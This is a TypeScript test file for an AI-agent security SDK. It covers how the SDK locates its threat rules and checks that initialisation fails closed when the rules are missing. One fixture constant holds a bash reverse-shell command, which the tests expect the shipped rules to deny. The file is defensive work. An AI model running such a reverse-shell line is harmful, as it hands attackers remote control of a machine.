/**
 * Rule-data resolution and `init()` failure modes (AIDR-018).
 *
 * These tests cover the two situations that do not need a packed tarball:
 *
 *   (a) running from the monorepo source tree — the rules may live either in the
 *       built `packages/sdk/resources/` or at the repository root, and the
 *       resolved directory must NOT depend on `process.cwd()`;
 *   (c) the rule data is genuinely missing — `init()` must fail with an explicit
 *       error that names every path it searched, and `check()` must not report a
 *       clean result afterwards.
 *
 * Situation (b) — an installed package with the assets next to `dist/` — is
 * covered end-to-end from a real packed tarball in `packaging.test.ts`.
 */

import { copyFileSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { loadThreats } from "@singularityrd/aidr-core";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
	AIDRDataDirError,
	AIDRInitError,
	getBundledDataDirs,
	resolveDataDirs,
} from "../bundled-dirs.js";
import { AIDRClient } from "../client.js";
import type { CheckResult, SDKConfig } from "../config.js";
import { createMiddleware } from "../middleware.js";

const TEST_DIR = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(TEST_DIR, "..", "..", "..", "..");
const SDK_PACKAGE_DIR = resolve(REPO_ROOT, "packages", "sdk");

/** A command that must be denied by a shipped rule (CLT-CMD-003/005). */
const MALICIOUS_COMMAND = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
/** An ordinary command that must be allowed. */
const BENIGN_COMMAND = "ls -la /tmp";

function baseConfig(overrides: Partial<SDKConfig> = {}): SDKConfig {
	return {
		apiKey: "test-key",
		timeout: 5000,
		retries: 0,
		cache: false,
		cacheTtl: 300000,
		environment: "production",
		...overrides,
	};
}

/** Write a minimal but valid rules file (one threat) / allowlist file. */
function writeRulesFixtures(dir: string): { threatsDir: string; allowlistsDir: string } {
	const threatsDir = join(dir, "custom-threats");
	const allowlistsDir = join(dir, "custom-allowlists");
	mkdirSync(threatsDir, { recursive: true });
	mkdirSync(allowlistsDir, { recursive: true });
	writeFileSync(
		join(threatsDir, "probe.yaml"),
		[
			'- id: "TEST-001"',
			"  category: tool",
			"  severity: critical",
			"  confidence: 1.0",
			"  action: block",
			'  pattern: "AIDR_TEST_PROBE"',
			"  match_on: command",
			'  title: "Test probe rule"',
			"  expires_at: null",
			"  revoked: false",
			"",
		].join("\n"),
	);
	writeFileSync(
		join(allowlistsDir, "probe.yaml"),
		['- domain: "example.invalid"', '  reason: "test fixture"', ""].join("\n"),
	);
	return { threatsDir, allowlistsDir };
}

const ENV_KEYS = ["AIDR_THREATS_DIR", "AIDR_ALLOWLISTS_DIR"] as const;

describe("SDK rule-data resolution", () => {
	let tmpDir: string;
	const savedEnv: Record<string, string | undefined> = {};

	beforeEach(() => {
		tmpDir = mkdtempSync(join(tmpdir(), "aidr-sdk-datadirs-"));
		for (const key of ENV_KEYS) savedEnv[key] = process.env[key];
	});

	afterEach(() => {
		for (const key of ENV_KEYS) {
			if (savedEnv[key] === undefined) delete process.env[key];
			else process.env[key] = savedEnv[key];
		}
		rmSync(tmpDir, { recursive: true, force: true });
	});

	describe("(a) monorepo source tree", () => {
		it("resolves the shipped rules relative to the module, not the cwd", async () => {
			// A cwd outside the repository must not change the answer.
			const fromRepoCwd = resolveDataDirs({ cwd: REPO_ROOT });
			const fromForeignCwd = resolveDataDirs({ cwd: tmpDir });

			expect(fromForeignCwd.threatsDir).toBe(fromRepoCwd.threatsDir);
			expect(fromForeignCwd.allowlistsDir).toBe(fromRepoCwd.allowlistsDir);
			expect(["package", "source-tree"]).toContain(fromForeignCwd.sources.threats);
			expect(["package", "source-tree"]).toContain(fromForeignCwd.sources.allowlists);

			// "source-tree" here means the checkout; "package" means the built
			// resources/ directory inside packages/sdk. Either way the rules must
			// actually load.
			const threats = await loadThreats(fromForeignCwd.threatsDir);
			expect(threats.length).toBeGreaterThan(0);
		});

		it("walks up to the checkout root when resources/ has not been built", () => {
			// Simulate a dev run before `sync-assets`: moduleDir points at a
			// directory that has no resources/ beside it.
			const dirs = resolveDataDirs({
				moduleDir: join(SDK_PACKAGE_DIR, "src", "no-such-dir"),
				cwd: tmpDir,
				env: {},
			});

			expect(dirs.sources.threats).toBe("source-tree");
			expect(dirs.sources.allowlists).toBe("source-tree");
			expect(dirs.threatsDir).toBe(join(REPO_ROOT, "threats"));
			expect(dirs.allowlistsDir).toBe(join(REPO_ROOT, "allowlists"));
			expect(dirs.searchedPaths.threats).toContain(join(REPO_ROOT, "threats"));
		});

		it("initialises and actually detects from the source tree", async () => {
			const client = new AIDRClient(baseConfig());
			await client.init();

			const dataDirs = client.getDataDirs();
			expect(dataDirs?.threatsDir).toBe(resolveDataDirs().threatsDir);

			const malicious = await client.check({ action: "execute", resource: MALICIOUS_COMMAND });
			expect(malicious.decision).toBe("deny");
			expect(malicious.allowed).toBe(false);

			const benign = await client.check({ action: "execute", resource: BENIGN_COMMAND });
			expect(benign.decision).toBe("allow");
			expect(benign.allowed).toBe(true);

			client.dispose();
		});

		it("reports the resolved directories through getBundledDataDirs()", () => {
			const resolved = getBundledDataDirs();
			expect(resolved.moduleDir.endsWith(join("sdk", "src"))).toBe(true);
			expect(resolved.threatsDir.length).toBeGreaterThan(0);
			expect(resolved.sources.threats).toBeDefined();
		});
	});

	describe("(c) missing rule data fails loudly", () => {
		it("throws a data-dir error naming every path it searched", () => {
			let error: unknown;
			try {
				resolveDataDirs({ moduleDir: tmpDir, cwd: tmpDir, env: {} });
			} catch (e) {
				error = e;
			}

			expect(error).toBeInstanceOf(AIDRDataDirError);
			const dataDirError = error as AIDRDataDirError;
			expect(dataDirError.kind).toBe("threats");
			expect(dataDirError.searchedPaths.length).toBeGreaterThanOrEqual(3);
			// Every candidate the resolver considered is listed in the message.
			for (const path of dataDirError.searchedPaths) {
				expect(dataDirError.message).toContain(path);
			}
			expect(dataDirError.message).toContain(join(tmpDir, "resources", "threats"));
			expect(dataDirError.message).toContain('no usable "threats" directory');
			expect(dataDirError.message).toContain("AIDR_THREATS_DIR");
		});

		it("treats an unusable AIDR_THREATS_DIR override as an error, not a silent fallback", () => {
			const missing = join(tmpDir, "typo-threats");
			let error: unknown;
			try {
				resolveDataDirs({ env: { AIDR_THREATS_DIR: missing } });
			} catch (e) {
				error = e;
			}

			expect(error).toBeInstanceOf(AIDRDataDirError);
			const dataDirError = error as AIDRDataDirError;
			expect(dataDirError.searchedPaths).toEqual([missing]);
			expect(dataDirError.message).toContain(missing);
		});

		it("init() rejects and check() never reports a result", async () => {
			process.env.AIDR_THREATS_DIR = join(tmpDir, "missing-threats");
			const client = new AIDRClient(baseConfig());

			await expect(client.init()).rejects.toThrow(AIDRDataDirError);
			expect(client.getDataDirs()).toBeUndefined();

			// The whole point: a broken install must not answer. Not with `allow`,
			// and not with the safe-looking `ask` fallback either.
			let checkResult: CheckResult | undefined;
			let checkError: unknown;
			try {
				checkResult = await client.check({ action: "execute", resource: BENIGN_COMMAND });
			} catch (e) {
				checkError = e;
			}
			expect(checkResult).toBeUndefined();
			expect(checkError).toBeInstanceOf(AIDRDataDirError);
		});

		it("init() rejects when the rules directory exists but holds no rules", async () => {
			const emptyThreats = join(tmpDir, "empty-threats");
			const { allowlistsDir } = writeRulesFixtures(tmpDir);
			mkdirSync(emptyThreats, { recursive: true });
			process.env.AIDR_THREATS_DIR = emptyThreats;
			process.env.AIDR_ALLOWLISTS_DIR = allowlistsDir;

			const client = new AIDRClient(baseConfig());
			let error: unknown;
			try {
				await client.init();
			} catch (e) {
				error = e;
			}

			expect(error).toBeInstanceOf(AIDRInitError);
			expect((error as AIDRInitError).message).toContain("no loadable threat rules");
			expect((error as AIDRInitError).message).toContain(emptyThreats);
			expect((error as AIDRInitError).searchedPaths).toEqual([emptyThreats]);
		});

		it("a wrapped function never executes when the client cannot initialise", async () => {
			// The original symptom of this defect: init() threw, and because the
			// fail-closed enforcement turned the follow-up failure into an `ask`
			// fallback, callers saw "ask" forever. Nothing may execute here at all.
			process.env.AIDR_THREATS_DIR = join(tmpDir, "missing-threats");
			const client = new AIDRClient(baseConfig());
			const executed = vi.fn().mockReturnValue("EXECUTED");
			const wrapped = createMiddleware(client).wrap(executed, () => ({
				action: "execute",
				resource: BENIGN_COMMAND,
			}));

			await expect(wrapped()).rejects.toThrow(AIDRDataDirError);
			expect(executed).not.toHaveBeenCalled();
			client.dispose();
		});

		it("init() rejects when the allowlists override cannot be resolved", async () => {
			const { threatsDir } = writeRulesFixtures(tmpDir);
			process.env.AIDR_THREATS_DIR = threatsDir;
			process.env.AIDR_ALLOWLISTS_DIR = join(tmpDir, "missing-allowlists");

			const client = new AIDRClient(baseConfig());
			let error: unknown;
			try {
				await client.init();
			} catch (e) {
				error = e;
			}

			expect(error).toBeInstanceOf(AIDRDataDirError);
			expect((error as AIDRDataDirError).kind).toBe("allowlists");
			expect((error as AIDRDataDirError).message).toContain(join(tmpDir, "missing-allowlists"));
		});
	});

	describe("explicit overrides and legacy layouts", () => {
		it("honours AIDR_THREATS_DIR / AIDR_ALLOWLISTS_DIR", () => {
			const { threatsDir, allowlistsDir } = writeRulesFixtures(tmpDir);
			const dirs = resolveDataDirs({
				env: { AIDR_THREATS_DIR: threatsDir, AIDR_ALLOWLISTS_DIR: allowlistsDir },
			});

			expect(dirs.threatsDir).toBe(threatsDir);
			expect(dirs.allowlistsDir).toBe(allowlistsDir);
			expect(dirs.sources).toEqual({ threats: "env", allowlists: "env" });
		});

		it("still resolves a legacy cwd-relative layout as the last resort", () => {
			const { threatsDir, allowlistsDir } = writeRulesFixtures(tmpDir);
			// Rebuild the legacy shape: <cwd>/threats + <cwd>/allowlists
			const legacyRoot = join(tmpDir, "legacy-app");
			const legacyThreats = join(legacyRoot, "threats");
			const legacyAllowlists = join(legacyRoot, "allowlists");
			mkdirSync(legacyThreats, { recursive: true });
			mkdirSync(legacyAllowlists, { recursive: true });
			copyFileSync(join(threatsDir, "probe.yaml"), join(legacyThreats, "probe.yaml"));
			copyFileSync(join(allowlistsDir, "probe.yaml"), join(legacyAllowlists, "probe.yaml"));

			// moduleDir is an unrelated empty directory, so only the cwd candidate
			// can match.
			const isolated = join(tmpDir, "isolated-module");
			mkdirSync(isolated, { recursive: true });
			const dirs = resolveDataDirs({ moduleDir: isolated, cwd: legacyRoot, env: {} });

			expect(dirs.sources).toEqual({ threats: "cwd", allowlists: "cwd" });
			expect(dirs.threatsDir).toBe(legacyThreats);
			expect(dirs.allowlistsDir).toBe(legacyAllowlists);
		});
	});
});

describe("AIDRClient config validation", () => {
	it("rejects an invalid configuration at construction time", () => {
		expect(() => new AIDRClient({ apiKey: "" } as SDKConfig)).toThrow();
		expect(
			() => new AIDRClient({ ...baseConfig(), retries: 99 } as unknown as SDKConfig),
		).toThrow();
	});

	it("applies the schema defaults so the retry loop always has a value", async () => {
		// `retries` is omitted deliberately: before this fix it stayed `undefined`,
		// `0 <= undefined` was false and the loop body never ran at all.
		const client = new AIDRClient({ apiKey: "test-key", cache: false } as unknown as SDKConfig);
		const internal = client as unknown as {
			initialized: boolean;
			init: () => Promise<void>;
			_performCheck: () => Promise<CheckResult>;
			_sleep: (ms: number) => Promise<void>;
		};
		internal.initialized = true;
		internal.init = async () => {};

		const sleeps: number[] = [];
		internal._sleep = async (ms: number) => {
			sleeps.push(ms);
		};

		let failuresLeft = 2; // schema default retries = 2
		let attempts = 0;
		internal._performCheck = async () => {
			attempts++;
			if (failuresLeft-- > 0) throw new Error("transient failure");
			return { allowed: true, decision: "allow", confidence: 0.9 };
		};

		const result = await client.check({ action: "read", resource: "test://resource" });

		expect(result.decision).toBe("allow");
		expect(attempts).toBe(3); // initial attempt + 2 retries
		expect(sleeps).toEqual([1000, 2000]); // retryDelays, i.e. the loop ran
		client.dispose();
	});

	it("re-validates updates instead of accepting an unusable retries value", () => {
		const client = new AIDRClient(baseConfig());
		expect(() => client.updateConfig({ retries: 42 })).toThrow();
		expect(() => client.updateConfig({ retries: 1 })).not.toThrow();
		client.dispose();
	});
});
